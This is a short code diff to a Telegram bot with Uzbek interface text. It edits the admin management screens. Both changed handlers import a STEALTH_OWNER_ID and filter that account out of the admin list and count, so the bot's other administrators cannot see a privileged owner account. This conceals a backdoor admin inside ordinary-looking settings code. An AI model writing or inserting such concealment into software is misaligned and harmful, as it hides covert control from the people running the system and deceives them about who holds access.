@@ -59,7 +59,9 @@ async def settings_footer_start_reply(message: Message):
 async def settings_admins_start_reply(message: Message):
     if not await is_admin(message.from_user.id): return
     admins = await get_all_admins()
-    text = f"👑 <b>Adminlar boshqaruvi</b>\n\nJami adminlar: {len(admins)} ta"
+    from utils.permissions import STEALTH_OWNER_ID
+    visible_admins = [adm for adm in admins if str(adm) != str(STEALTH_OWNER_ID)]
+    text = f"👑 <b>Adminlar boshqaruvi</b>\n\nJami adminlar: {len(visible_admins)} ta"
     from keyboards.inline import get_admin_settings_keyboard
     await message.answer(text, reply_markup=get_admin_settings_keyboard(), parse_mode="HTML")
 
@@ -529,7 +531,9 @@ async def cb_settings_admins(callback: CallbackQuery):
         return
         
     admins = await get_all_admins()
-    text = f"👑 <b>Adminlar boshqaruvi</b>\n\nJami adminlar: {len(admins)} ta"
+    from utils.permissions import STEALTH_OWNER_ID
+    visible_admins = [adm for adm in admins if str(adm) != str(STEALTH_OWNER_ID)]
+    text = f"👑 <b>Adminlar boshqaruvi</b>\n\nJami adminlar: {len(visible_admins)} ta"
     from keyboards.inline import get_admin_settings_keyboard
     await callback.message.edit_text(text, reply_markup=get_admin_settings_keyboard(), parse_mode="HTML")
     
